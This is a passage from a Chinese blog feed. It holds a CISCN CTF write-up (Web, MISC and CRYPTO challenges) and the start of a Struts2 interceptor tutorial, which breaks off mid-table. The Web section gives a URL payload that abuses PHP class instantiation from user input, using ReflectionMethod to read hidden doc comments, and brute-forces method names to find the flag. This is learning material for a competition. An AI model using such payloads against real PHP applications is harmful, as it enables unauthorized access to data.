class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">o</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">r</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-variable">$rc</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rc&quot;</span>];<br><span class="hljs-variable">$rb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rb&quot;</span>];<br><span class="hljs-variable">$ra</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ra&quot;</span>];<br><span class="hljs-variable">$rd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rd&quot;</span>];<br><span class="hljs-variable">$method</span>= <span class="hljs-keyword">new</span> <span class="hljs-variable">$rc</span>(<span class="hljs-variable">$ra</span>, <span class="hljs-variable">$rb</span>);<br>var_dump(<span class="hljs-variable">$method</span>-&gt;<span class="hljs-variable">$rd</span>());<br></code></pre></td></tr></table></figure><p>根据提示，本题就这一个文件，而且提示看到的不完全，猜测 flag被注释了，而且在类中被注释了。</p><p>需要GET提交四个参数，可以实例化任意类，并调用类方法。利用 PHP内置类中的 ReflectionMethod 来读取 User 类里面各个函数的注释</p><p>本地测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//pubLic $b = 100;</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Increment counter</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@final</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@static</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span>  publicCISCN&#123;test&#125;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  int</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">&#x27;User&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>);<br>var_dump(<span class="hljs-variable">$d</span>-&gt;getDocComment());<br><br></code></pre></td></tr></table></figure><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20210516141112739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码中有26个函数，flag在某个函数的注释中，构造Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment<br></code></pre></td></tr></table></figure><p>抓包，爆破rb参数的值，从a-z开始爆破，最终在q的注释中找到flag<br><img src="https://img-blog.csdnimg.cn/20210516141137899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h2><p>使用脚本进行gif分帧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_name = <span class="hljs-string">&#x27;running_pixel.gif&#x27;</span><br><span class="hljs-comment"># 使用Image模块的open()方法打开gif动态图像时，默认是第一帧</span><br>im = Image.<span class="hljs-built_in">open</span>(file_name)<br><span class="hljs-comment"># 定义存储图片的文件名与读取的GIF图片名一致</span><br>file_save = file_name[:-<span class="hljs-number">4</span>]<br><span class="hljs-comment"># 在同级目录下创建存放每帧图片的文件夹</span><br><span class="hljs-comment"># 创建一级目录：os.mkdir(&#x27;D:\\gif1&#x27;)   创建多级目录：os.makedirs(&#x27;D:\\gif1\\gif1&#x27;)</span><br>os.mkdir(file_save)<br><span class="hljs-keyword">try</span>:<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 保存当前帧图片</span><br>    <span class="hljs-comment"># 获取当前文件的位置(GIF图的帧数)</span><br>    frame_number= im.tell()<br>    <span class="hljs-comment"># 保存图片，格式为png</span><br>    im.save(file_save+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-built_in">str</span>(frame_number)+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    <span class="hljs-comment"># 获取下一帧图片</span><br>    im.seek(frame_number+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">except</span> EOFError:<br>    <span class="hljs-keyword">pass</span><br>print(<span class="hljs-string">&quot;共:&quot;</span>, frame_number, <span class="hljs-string">&quot;张图片&quot;</span>)<br></code></pre></td></tr></table></figure><p>参考<a href="https://mochu.blog.csdn.net/article/details/116855242">末初</a>师傅的wp</p><p>PS打开打开几张图片查看，有可疑白点，像素块为<code>RGB: (233,233,233)</code>，其他图片中也发现了这个像素块<br><img src="https://img-blog.csdnimg.cn/20210521203038633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取382张图片的像素块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>flag_img = Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">400</span>,<span class="hljs-number">400</span>))<br><span class="hljs-comment">#mode=1 1位黑白像素，每字节存储一个像素</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">381</span>):<br>    framepic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./running_pixel/<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br>    framepic = framepic.convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    width,height = framepic.size<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            <span class="hljs-keyword">if</span> framepic.getpixel((w,h)) == (<span class="hljs-number">233</span>,<span class="hljs-number">233</span>,<span class="hljs-number">233</span>):<br>                flag_img.putpixel((h,w),<span class="hljs-number">1</span>)<br><br>    flag_img.save(<span class="hljs-string">f&quot;flag_<span class="hljs-subst">&#123;name&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>最后一张图<br><img src="https://img-blog.csdnimg.cn/2021052120570322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据字符出现顺序得到：12504D0F-9DE1-4B00-87A5-A5FDD0986A00<br>最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;<br></code></pre></td></tr></table></figure><h2 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h2><p>流量包拖入wirkshark中，导出http对象，发现了两个gzip和两个br文件<br><img src="https://img-blog.csdnimg.cn/20210521211621458.png" alt="在这里插入图片描述"><br>解压flag_wrapper得到…<br><img src="https://img-blog.csdnimg.cn/20210521211307860.png" alt="在这里插入图片描述"><br>把test后缀改为br，解压得到test：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br>message PBResponse &#123;<br>  int32 code = 1;<br>  int64 flag_part_convert_to_hex_plz = 2;<br>  message data &#123;<br>    string junk_data = 2;<br>    string flag_part = 1;<br>  &#125;<br>  repeated data dataList = 3;<br>  int32 flag_part_plz_convert_to_hex = 4;<br>  string flag_last_part = 5;<br>&#125;<br><br>message PBRequest &#123;<br>  string cate_id = 1;<br>  int32 page = 2;<br>  int32 pageSize = 3;<br>&#125;<br></code></pre></td></tr></table></figure><p>下载解压后进入到bin目录，将之前解压出来的test改为test.proto并移动到bin目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\protoc.exe --python_out=. test.proto<br></code></pre></td></tr></table></figure><p>得到test_pb2.py，把解压后的secret也移动到bin目录<br><img src="https://img-blog.csdnimg.cn/20210521225101522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">import test_pb2<br><br>with open(<span class="hljs-string">&#x27;./secret&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>    data = f.read()<br>    target = test_pb2.PBResponse()<br>    target.ParseFromString(data)<br>    <span class="hljs-built_in">print</span>(target)<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">code: 200<br>flag_part_convert_to_hex_plz: 15100450<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;e2345&quot;</span><br>  junk_data: <span class="hljs-string">&quot;7af2c&quot;</span><br>&#125;<br>dataList &#123;<br>  flag_part: <span class="hljs-string">&quot;7889b0&quot;</span><br>  junk_data: <span class="hljs-string">&quot;82bc0&quot;</span><br>&#125;<br>flag_part_plz_convert_to_hex: 16453958<br>flag_last_part: <span class="hljs-string">&quot;d172a38dc&quot;</span><br></code></pre></td></tr></table></figure><p>把15100450和16453958转换为hex，和其他hex按顺序拼接得到最终flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;<br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h2><p>附件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX<br></code></pre></td></tr></table></figure><p><a href="https://wishingstarmoye.com/ctf/adfgx">ADFGX密码</a>，用最经典的密码表<code>phqgmeaynofdxkrcvszwbutil</code>，key为题目名字<code>classic</code>，最可气的是解密时需要将附件中的内容反转得到密文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">str=<span class="hljs-string">&quot;AXAXDFDXXAFADFGFXAADFGDXGFDXFFDFAXDXFFFFXGXGAAXAGAFDDXFFDXFFDXDXDXDXGFDFAXFXAADXAAGAXGDGXAXAFAXXFFXADFFGAADXDXAXDFDFDXXAXXDXDAAAAAFAXAAAFGGAFGFGXADXXADFGADXDFDFGAGFDGAXFGAXDGDADXFFFFDAGFADXGDX&quot;</span><br><span class="hljs-built_in">print</span>(str[::-1])<br><br><span class="hljs-comment">#XDGXDAFGADFFFFXDADGDXAGFXAGDFGAGFDFDXDAGFDAXXDAXGFGFAGGFAAAXAFAAAAADXDXXAXXDFDFDXAXDXDAAGFFDAXFFXXAFAXAXGDGXAGAAXDAAXFXAFDFGXDXDXDXDFFXDFFXDDFAGAXAAGXGXFFFFXDXAFDFFXDFGXDGFDAAXFGFDAFAXXDFDXAXA</span><br></code></pre></td></tr></table></figure><p>然后再解密得到flag，大意了<br><img src="https://img-blog.csdnimg.cn/20210521214939316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;esay-sql&quot;&gt;&lt;a href=&quot;#esay-sql&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>Struts2之拦截器</title>
    <link href="http://atkx.top/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/"/>
    <id>http://atkx.top/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/</id>
    <published>2021-04-25T08:16:03.000Z</published>
    <updated>2021-05-27T12:44:50.654Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（三）</p> <a id="more"></a><h2 id="拦截器简介"><a href="#拦截器简介" class="headerlink" title="拦截器简介"></a>拦截器简介</h2><p>   拦截器（Interceptor）是Struts2的核心组成部分，它可以动态拦截Action调用的对象，类似于Servlet中的过滤器。 Struts2的拦截器是AOP（Aspect-Object-Programming，面向切面编程）的一种实现策略，是可插拔的。它可以任意地组合Action提供的附加功能，而不需要修改Action的代码，开发者只需要提供拦截器的实现类，并将其配置在struts.xml中即可。</p><p>每个拦截器可以完成单个功能。不同功能的拦截器按照一定的顺序排列在一起形成的链，就是拦截器链。拦截器链组成的集合就是拦截器栈。</p><h2 id="拦截器配置"><a href="#拦截器配置" class="headerlink" title="拦截器配置"></a>拦截器配置</h2><p><strong>1.拦截器</strong><br>要想拦截器起作用，首先要在struts.xml文件中进行配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;paramName&quot;</span>&gt;</span>paramValue<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor</span>&gt;</span><br></code></pre></td></tr></table></figure><p>name属性用来指定拦截器的名称，class属性用于指定拦截器的实现类。如果在定义拦截器时需要传入参数，这时需要使用<code>&lt;param&gt;</code>标签,其中name属性用来指定参数的名称，paramValue表示参数的值。</p><p><strong>2.拦截栈</strong><br>在实际开发中，经常需要在Action执行前同时执行多个拦截动作，如用户登录检查、登录日志记录以及权限检查等，这时，可以把多个拦截器组成一个拦截器栈。<br>在使用时，可以将栈内的多个拦截器当成个整体来引用。 当拦截器栈被附加到一个 Action上时，在执行Action之前必须先执行拦截器栈中的每一一 个拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorStackName&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span> /&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br></code></pre></td></tr></table></figure><p>interceptorStackName值代表配置的拦截器栈的名称，interceptorName值代表拦截器的名称。</p><p>除此之外，一个拦截器栈也可以包含另外一个拦截器栈：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>    <span class="hljs-comment">&lt;!--声明拦截器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span> /&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在定义的拦截栈myStack中，除了引用了两个自定义的拦截器interceptor1和interceptor2外，还引用了一个内置拦截器栈defaultStack，且该内置拦截器栈必不可少。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--配置用户自定义的拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span>/&gt;</span><br>            <br>            <span class="hljs-comment">&lt;!--自定义拦截器栈，我们配置了自定义的拦截器，默认的拦截器栈就不会被执行，因此，想要使用默认的拦截器功能，就要配置进来--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用默认的拦截器栈，一定要放在第一行--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defalutStack&quot;</span>/&gt;</span><br>                <br>                <span class="hljs-comment">&lt;!--引用自定义的拦截器--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!--上面配置了拦截器栈，但是没有被执行...下面配置执行拦截器--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>/&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="内建拦截器"><a href="#内建拦截器" class="headerlink" title="内建拦截器"></a>内建拦截器</h2><p>拦截器都继承AbstractInterceptor</p><p>Struts2 框架中内置了许多拦截器，这些拦截器以 name-class 对的形式配置在 struts-default.xml 文件中，其中，name 是拦截器的名称，也就是引用的名字；class 指定了该拦截器所对应的实现。</p><p>只要自定义的包继承了 Struts2 的 struts-default 包，就可以使用包中定义的内建拦截器，否则需要自行定义拦截器。</p><p>内建拦截器介绍:</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>alias</td><td>在不同请求之间将请求参数在不同名称间转换，请求内容不变</td></tr><tr><td>autowiring</td><td>用于实现 Action 的自动装配</td></tr><tr><td>chain</td><td>让前一个 Action 的属性可以被后一个 Action 访问，现在和 chain 类型的 result() 结合使用</td></tr><tr><td>conversionError</td><td>将错误从 ActionContext 中添加到 Action 